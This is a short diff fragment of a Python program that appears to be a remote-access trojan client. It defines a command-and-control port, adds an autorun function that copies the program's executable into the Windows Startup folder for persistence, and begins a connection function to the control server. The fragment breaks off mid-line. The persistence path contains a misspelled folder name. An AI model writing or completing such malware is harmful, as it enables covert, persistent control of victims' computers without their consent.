@@ -15,4 +15,9 @@ CCPORT = 443  #SSL CONNECTION
 def autorun():
     filen = os.path.basename(__file__)
     exe_file = filen.replace('.py', '.exe')
-    os.system('copy {} "\\%APPDATA%\\Microsoft\\Windows\\Start Menu\\Porgrams\\Startup"')
+    os.system('copy {} "\\%APPDATA%\\Microsoft\\Windows\\Start Menu\\Porgrams\\Startup"'.format(exe_file))
+    
+#connection Funciton for ip and port
+
+def conn(CCIP, CCPORT):
+    client = 
